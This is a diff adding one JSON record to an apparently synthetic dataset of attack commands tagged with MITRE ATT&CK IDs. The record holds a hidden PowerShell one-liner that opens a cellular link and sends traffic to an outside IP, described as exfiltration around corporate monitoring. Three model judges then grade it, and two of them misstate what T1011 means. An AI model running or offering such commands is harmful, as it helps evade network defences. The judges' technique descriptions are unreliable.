@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh mbn connect interface=\"Cellular\" connmode=name name=\"CorpBypass\" | Out-Null; $cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 100.72.55.9 -p 53433 -B $ip -t 60\"",
+  "explanation": "Establishes a mobile broadband session and binds iperf3 to the Cellular interface, exfiltrating via cellular data instead of enterprise LAN (T1011).",
+  "rationale_steps": [
+    "Initiate a mobile broadband connection to enable the cellular medium.",
+    "Resolve the cellular interface IP address.",
+    "Bind iperf3 to that IP on an uncommon port for data egress.",
+    "Execute hidden to reduce casual observation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-f87300ae",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax including balanced quotes, correct pipe operators, valid variable assignments, error handling with -ErrorAction parameter, and proper command chaining with semicolons.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does establish a cellular connection that could bypass enterprise monitoring (alternative exfiltration channel), it doesn't directly modify system images as described in T1011 (Exfiltration Over Other Network Medium), and appears to be misaligned with the technique description provided.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T18:37:22.381437Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, and valid flag formats for all components.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command successfully achieves its operational goal of establishing a cellular connection and exfiltrating data via iperf3, this activity has no semantic relation to MITRE ATT&CK T1011 'Modify System Image,' which involves altering firmware or OS images, not network interface manipulation or data transfer.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T18:37:30.491826Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed PowerShell with balanced quotes, valid netsh/Start-Process usage, proper separators, and correct iperf3 arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "It connects a mobile broadband profile and binds iperf3 to the cellular IP to egress over the cellular interface (aligned with T1011), though iperf3 is a throughput tool rather than actual data exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T18:38:12.717475Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
